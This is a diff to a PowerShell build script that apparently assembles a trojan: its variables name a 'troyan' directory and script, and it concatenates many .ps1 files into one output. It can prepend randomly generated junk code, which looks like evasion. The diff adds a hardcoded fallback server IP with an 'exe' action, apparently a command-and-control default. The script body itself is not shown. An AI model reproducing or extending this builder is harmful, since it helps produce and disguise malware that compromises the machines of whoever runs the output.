@@ -1,6 +1,12 @@
 param (
     [string]$serverName
 )
+
+if ($serverName -eq "") {
+    $serverName = "185.247.141.125"
+    $action = "exe"
+} 
+
 if ([string]::IsNullOrEmpty($serverName)) {
         throw "-serverName argument is null"
 }
@@ -35,9 +41,9 @@ function GetUtfNoBom {
     return $contentWithoutBom
 }
 
-
-if (-not (Test-Path $server.troyanDir)) {
-    New-Item -Path $server.troyanDir -ItemType Directory
+$outPath = Join-Path -Path $server.troyanDir -ChildPath "_output"
+if (-not (Test-Path $outPath )) {
+    New-Item -Path $outPath  -ItemType Directory
 }
 if (Test-Path -Path $server.troyanScript) {
     Remove-Item -Path $server.troyanScript
@@ -136,7 +142,7 @@ Function Check-Array {
         [object]$InputObject
     )
 
-    if ($null -ne $InputObject -and $InputObject.Length -gt 0) {
+    if ($null -ne $InputObject -and $InputObject.Length -gt 0 -and $InputObject -ne '') {
         return $true
     } else {
         return $false
@@ -270,7 +276,7 @@ function BuldScript{
         [string]$outputFile, [bool]$random)
 
         $pref = '
-        $generalJob = Start-Job -ScriptBlock {
+        # $generalJob = Start-Job -ScriptBlock {
 
             function writedbg2 {
                     param (
@@ -280,19 +286,18 @@ function BuldScript{
                 '
 
         $suff = '
-                }
-        Wait-Job -Job $generalJob
-        Receive-Job -Job $generalJob
-        Remove-Job -Job $generalJob
+       #    }
+       # Wait-Job -Job $generalJob
+       # Receive-Job -Job $generalJob
+       # Remove-Job -Job $generalJob
         ';
-        $pref=''
-        $suff=''
 
+
+    $joinedContent = $pref
     if ($random -eq $true)
     {
         $joinedContent += Generate-RandomCode
     }
-    $joinedContent += $pref
     foreach ($file in $ps1Files) {
         $fileContent = GetUtfNoBom -file $file.FullName
         $fileContent = $fileContent -replace '\.\s+\./[^/]+\.ps1', "`n`n"
